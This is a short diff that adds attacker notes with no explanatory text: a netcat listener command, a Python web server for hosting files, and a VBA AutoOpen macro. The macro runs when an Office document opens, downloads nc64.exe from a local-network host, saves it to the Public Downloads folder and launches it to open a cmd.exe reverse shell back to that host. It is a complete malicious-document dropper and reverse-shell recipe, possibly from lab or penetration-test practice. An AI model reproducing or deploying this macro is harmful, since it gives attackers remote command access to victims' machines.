@@ -1,0 +1,29 @@
+======================================================
+
+sudo nc -lvp 1234
+
+======================================================
+
+python3 -m http.server
+
+======================================================
+
+Sub AutoOpen()
+
+Dim xHttp1: Set xHttp1 = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm1: Set bStrm1 = CreateObject("Adodb.Stream")
+xHttp1.Open "GET", "http://192.168.0.21:8000/nc64.exe", False
+xHttp1.Send
+
+With bStrm1
+    .Type = 1 '//binary
+    .Open
+    .write xHttp1.responseBody
+    .savetofile "C:\Users\Public\Downloads\nc64.exe", 2 '//overwrite
+End With
+
+Shell ("C:\Users\Public\Downloads\nc64.exe -n 192.168.0.21 1234 -e cmd.exe")
+
+End Sub
+
+======================================================
